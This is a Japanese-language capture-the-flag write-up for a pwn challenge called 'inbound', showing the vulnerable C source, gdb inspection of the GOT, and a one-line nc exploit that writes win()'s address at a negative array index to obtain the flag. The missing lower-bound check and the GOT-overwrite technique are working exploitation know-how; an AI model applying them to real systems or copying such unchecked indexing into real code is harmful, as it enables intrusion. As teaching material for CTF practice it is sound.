# inbound:Pwn:128pts
inside-of-bounds  

[inbound.tar.gz](inbound.tar.gz)  

`nc 34.170.146.252 51979`  

# Solution
ファイル一式と接続先が渡される。  
ソースは以下の通りであった。  
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int slot[10];

/* Call this function! */
void win() {
  char *args[] = {"/bin/cat", "/flag.txt", NULL};
  execve(args[0], args, NULL);
  exit(1);
}

int main() {
  int index, value;
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  printf("index: ");
  scanf("%d", &index);
  if (index >= 10) {
    puts("[-] out-of-bounds");
    exit(1);
  }

  printf("value: ");
  scanf("%d", &value);

  slot[index] = value;

  for (int i = 0; i < 10; i++)
    printf("slot[%d] = %d\n", i, slot[i]);

  exit(0);
}
```
0~9までのindexにvalueを設定できるサービスのようで、indexが10以上である場合は`out-of-bounds`と怒られる。  
`win`が見えるので、そちらに飛ばせばいいようだ。  
ソースを注意深く読んでいると、マイナス方面へのチェックがないことに気付く。  
以下のように`slot`のマイナス側に何があるか見てやる。  
```bash
$ gdb ./inbound
~~~
pwndbg> info variables slot
All variables matching regular expression "slot":

Non-debugging symbols:
0x0000000000404060  slot
pwndbg> x/32xg 0x0000000000404060 - 0x70
0x403ff0:       0x0000000000000000      0x0000000000000000
0x404000 <puts@got.plt>:        0x0000000000401030      0x0000000000401040
0x404010 <printf@got.plt>:      0x0000000000401050      0x0000000000401060
0x404020 <__isoc99_scanf@got.plt>:      0x0000000000401070      0x0000000000401080
0x404030:       0x0000000000000000      0x0000000000000000
0x404040 <stdout@GLIBC_2.2.5>:  0x0000000000000000      0x0000000000000000
0x404050 <stdin@GLIBC_2.2.5>:   0x0000000000000000      0x0000000000000000
0x404060 <slot>:        0x0000000000000000      0x0000000000000000
0x404070 <slot+16>:     0x0000000000000000      0x0000000000000000
0x404080 <slot+32>:     0x0000000000000000      Cannot access memory at address 0x404088
```
いろいろなgotがある。  
-1からマイナスの値を増やして、適切なアドレスを`win`に書き換えてやる。  
```bash
$ gdb ./inbound
~~~
pwndbg> disass win
Dump of assembler code for function win:
   0x00000000004011d6 <+0>:     endbr64
   0x00000000004011da <+4>:     push   rbp
   0x00000000004011db <+5>:     mov    rbp,rsp
~~~
pwndbg> p 0x00000000004011d6
$1 = 4198870
~~~
$ echo -e "-1\n4198870" | nc 34.170.146.252 51979
~~~
$ echo -e "-2\n4198870" | nc 34.170.146.252 51979
~~~
$ echo -e "-14\n4198870" | nc 34.170.146.252 51979
index: value: slot[0] = 0
slot[1] = 0
slot[2] = 0
slot[3] = 0
slot[4] = 0
slot[5] = 0
slot[6] = 0
slot[7] = 0
slot[8] = 0
slot[9] = 0
Alpaca{p4rt14L_RELRO_1s_A_h4pPy_m0m3Nt}
```
-14で`win`に飛び、flagが得られた。  

## Alpaca{p4rt14L_RELRO_1s_A_h4pPy_m0m3Nt}